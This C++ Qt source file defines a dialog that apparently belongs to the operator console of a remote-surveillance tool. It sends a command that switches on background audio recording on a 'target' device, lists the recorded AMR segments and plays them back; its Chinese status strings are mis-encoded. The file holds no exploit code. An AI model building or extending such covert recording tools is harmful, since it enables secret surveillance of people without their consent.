#include "recorddlg.h"

#include "AmrPlayer.h"

#pragma comment(lib, "AmrDecoder.lib")

#include "target.h"
#include "maindlg.h"
#include <Windows.h>
#include "Utility.h"

RecordDlg::RecordDlg(QWidget *parent, Target* tar)
	: QFrame(parent), m_tar(tar), m_amr(NULL), m_curIndex(0)
{
	ui.setupUi(this);

	InitConnection();
	InitFileList();

	InitCustomText(this);
}

RecordDlg::~RecordDlg()
{
	if ( m_amr )
	{
		m_amr->Stop();
		delete m_amr;
	}
}

void RecordDlg::GetNewRecordFile( MSG* msg )
{
	std::wstring name = (PWCHAR)(msg->wParam);
	std::wstring startTime = name.substr(0, name.rfind(L'@'));
	QString text = QString::fromStdWString(startTime.substr(startTime.rfind('\\'), startTime.length()-startTime.rfind('\\'))).replace(';', ':');

	if ( ui.trRecordList->findItems(text, Qt::MatchExactly).count() != 0 )
		return;

	QTreeWidgetItem* item = new QTreeWidgetItem;
	item->setText(0, text);
	item->setData(0, Qt::UserRole, QString::fromStdWString(startTime));

	//HANDLE hf = CreateFileW(fileName.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//DWORD size = GetFileSize(hf, NULL);
	//CloseHandle(hf);

	//item->setText(1, QString("%1 KB").arg(size / 1024));
	ui.trRecordList->addTopLevelItem(item);
}

void RecordDlg::GetNewSettingInfo(MSG* msg)
{
	std::wstring info = (PCWCHAR)(msg->wParam);
	ui.lbStatus->setText(QString::fromStdWString(info));
}

void RecordDlg::OnBtnSettingClicked()
{
	bool open = ui.chkOpen->isChecked();
	ULONG time = ui.spnStopInterval->value();
	FrmMain->ctrConn->Send_BACKSOUND(m_tar->dwTargetID, open, time);
}

void RecordDlg::OnBtnStopRecordClicked()
{
	StopPlaySound();
}

void RecordDlg::OnTrRecordListItemDoubleClicked(QTreeWidgetItem* item, int column)
{
	std::wstring filePath = item->data(0, Qt::UserRole).toString().toStdWString();
	m_curFile = filePath;
	m_curIndex = 0;

	m_timer.stop();

	StartPlaySound();
}

void RecordDlg::InitConnection()
{
	connect(ui.btnSetting, SIGNAL(clicked()), this, SLOT(OnBtnSettingClicked()));
	connect(ui.btnStopRecord, SIGNAL(clicked()), this, SLOT(OnBtnStopRecordClicked()));
	connect(ui.trRecordList, SIGNAL(itemDoubleClicked(QTreeWidgetItem*, int)), this, SLOT(OnTrRecordListItemDoubleClicked(QTreeWidgetItem*, int)));
	connect(&m_timer, SIGNAL(timeout()), this, SLOT(TestSoundFinished()));
}

void RecordDlg::InitFileList()
{
	std::wstring localDir = m_tar->widBackSoundPath;

	std::wstring findStr = localDir + L"\\*.amr";

	WIN32_FIND_DATA fd = {0};
	HANDLE hf = FindFirstFile(findStr.c_str(), &fd);

	if ( INVALID_HANDLE_VALUE == hf )
		return;

	do 
	{
		std::wstring name = fd.cFileName;
		std::wstring startTime = name.substr(0, name.rfind(L'@'));
		QString text = QString::fromStdWString(startTime).replace(';', ':');

		if ( ui.trRecordList->findItems(text, Qt::MatchExactly).count() != 0 )
			continue;

		QTreeWidgetItem* item = new QTreeWidgetItem;
		item->setText(0, text);
		item->setData(0, Qt::UserRole, QString::fromStdWString(localDir + L"\\" + startTime));

		//std::wstring filePath = localDir + L"\\" + fd.cFileName;
		//HANDLE hf = CreateFileW(filePath.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		//DWORD size = GetFileSize(hf, NULL);
		//CloseHandle(hf);

		//item->setText(1, QString("%1 KB").arg(size / 1024));

		ui.trRecordList->addTopLevelItem(item);

	} while ( FindNextFile(hf, &fd) );

	FindClose(hf);
}

void RecordDlg::StartPlaySound()
{
	wchar_t file[1024] = {0};
	wsprintfW(file, L"%s@%d.amr", m_curFile.c_str(), m_curIndex);

	if ( !FileExist(file) )
	{
		ui.lbStatus->setText(QString::fromLocal8Bit("²¥·Å½áÊø"));
		m_timer.stop();
		return;
	}

	if ( m_amr == NULL )
		m_amr = new AmrPlayer(this->winId(), file);
	else
		m_amr->Load(file);

	m_amr->Start();

	WCHAR text[1024] = {0};
	wsprintfW(text, L"ÕýÔÚ²¥·ÅÂ¼Òô : %s - Æ¬¶Î %d ...", m_curFile.substr(m_curFile.rfind('\\')+1, m_curFile.length()-m_curFile.rfind('\\')-1).c_str(), m_curIndex);
	ui.lbStatus->setText(QString::fromStdWString(std::wstring(text)));

	if ( m_curIndex == 0 )
		m_timer.start();

	++m_curIndex;
}

void RecordDlg::StopPlaySound()
{
	if (m_amr)
		m_amr->Stop();
	ui.lbStatus->setText(QString::fromLocal8Bit("Í£Ö¹²¥·ÅÂ¼Òô"));
}

void RecordDlg::TestSoundFinished()
{
	qDebug() << m_amr->GetCurrentPosition() << " " << m_amr->GetDuration();
	
	double pos = m_amr->GetCurrentPosition();
	int duration = m_amr->GetDuration();

	if (  std::abs(pos - duration) < 1 )
		StartPlaySound();
}
